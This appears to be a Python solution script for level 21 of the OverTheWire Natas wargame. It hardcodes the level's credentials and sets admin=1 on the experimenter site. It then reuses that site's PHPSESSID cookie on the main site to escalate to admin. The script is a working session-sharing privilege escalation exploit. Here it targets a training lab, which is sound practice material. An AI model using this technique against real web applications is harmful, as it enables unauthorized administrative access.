import requests
from string import *


username = "natas21"
password = "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH"
url = f"http://{username}-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1"
url2 = f"http://{username}.natas.labs.overthewire.org/?debug=true"


session = requests.Session()
response = session.get(url, auth=(username, password))
print(response.text)
print("session id:", session.cookies.get("PHPSESSID"))
s = session.cookies.get("PHPSESSID")
print("Status code:", response.status_code)
response = session.get(url2, auth=(username, password), cookies={'PHPSESSID': s})
print(response.text)